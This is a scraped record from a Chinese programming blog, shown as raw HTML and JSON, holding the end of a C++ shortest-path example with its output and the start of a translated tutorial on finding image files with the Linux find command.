class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-140\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-141\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-142\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-143\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-144\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-145\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-146\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">ss_shortest_paths </span><span class=\"crayon-e\">ssp</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-147\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">ssp</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">shortest_paths</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-148\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">ssp</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">print_spaths</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-149\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-150\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0259 seconds] -->\r\n<p><strong>测试数据（图）</strong></p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/06/eec11cb6eb44d153d5f26ca0d45c3494.jpg\"><img class=\"aligncenter size-full wp-image-114069\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/eec11cb6eb44d153d5f26ca0d45c3494.jpg\" alt=\"2010110113034430\"></a></p>\n<p><strong>测试结果</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b6230fb5a847993702920\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmin weight : 8\r\npath: 0 2 6 9 10</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a847993702920-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a847993702920-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b6230fb5a847993702920-1\"><span class=\"crayon-e\">min </span><span class=\"crayon-v\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a847993702920-2\"><span class=\"crayon-v\">path</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114061\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114061votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114061\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/b89c67f02db5a4cdf6d8b456c94b51448e1c4363.jpg"},{"url_object_id": "50e131c5200d426df175c11073a3dcc7", "title": ["如何在 Linux 中使用 find"], "url": "http://blog.jobbole.com/114000/", "create_date": "2018/05/17", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 3, "tags": "IT技术, Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/18/4/how-use-find-linux\">Ben Cotton</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9648-1.html\">Linux中国/geekpi</a>   </div><p>在<a href=\"https://linux.cn/article-9585-1.html\">最近的一篇文章</a>中，Lewis Cowles 介绍了 <code>find</code> 命令。</p>\n<p><code>find</code> 是日常工具箱中功能更强大、更灵活的命令行工具之一，因此值得花费更多的时间。</p>\n<p>最简单的，<code>find</code> 跟上路径寻找一些东西。例如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625262b3ab6049146479\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind /\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625262b3ab6049146479-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625262b3ab6049146479-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625262b3ab6049146479-1\"><span class=\"crayon-v\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625262b3ab6049146479-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>它将找到（并打印出）系统中的每个文件。而且由于一切都是文件，你会得到很多需要整理的输出。这可能不能帮助你找到你要找的东西。你可以改变路径参数来缩小范围，但它不会比使用 <code>ls</code> 命令更有帮助。所以你需要考虑你想要找的东西。</p>\n<p>也许你想在主目录中找到所有的 JPEG 文件。 <code>-name</code> 参数允许你将结果限制为与给定模式匹配的文件。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625262b3ac0924552680\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind ~ -name '*jpg'\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625262b3ac0924552680-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625262b3ac0924552680-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625262b3ac0924552680-1\"><span class=\"crayon-v\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">name</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'*jpg'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625262b3ac0924552680-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>可是等等！如果它们中的一些是大写的扩展名会怎么样？<code>-iname</code> 就像 <code>-name</code>，但是不区分大小写。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625262b3ac6345219163\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind ~ -iname '*jpg'\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625262b3ac6345219163-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625262b3ac6345219163-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625262b3ac6345219163-1\"><span class=\"crayon-v\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">iname</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'*jpg'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625262b3ac6345219163-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>很好！但是 8.3 名称方案是如此的老。一些图片可能是 .jpeg 扩展名。幸运的是，我们可以将模式用“或”（表示为 <code>-o</code>）来组合。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625262b3aca919138121\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind ~ ( -iname 'jpeg' -o -iname 'jpg' )\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625262b3aca919138121-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625262b3aca919138121-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625262b3aca919138121-1\"><span class=\"crayon-v\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">iname</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'jpeg'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">iname</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'jpg'</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625262b3aca919138121-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>我们正在接近目标。但是如果你有一些以 jpg 结尾的目录呢？ （为什么你要命名一个 <code>bucketofjpg</code> 而不是 <code>pictures</code> 的目录就超出了本文的范围。）我们使用 <code>-type</code> 参数修改我们的命令来查找文件。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625262b3ace069247860\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind ~ <span class=\"MathJax_Preview\">\\( -iname '*jpeg' -o -iname '*jpg' \\)</span> -type f\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625262b3ace069247860-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625262b3ace069247860-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625262b3ace069247860-1\"><span class=\"crayon-e\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">iname</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'*jpeg'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">iname</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'*jpg'</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">type</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">f</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625262b3ace069247860-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0023 seconds] -->\r\n<p>或者，也许你想找到那些命名奇怪的目录，以便稍后重命名它们：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625262b3ad1610023533\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" 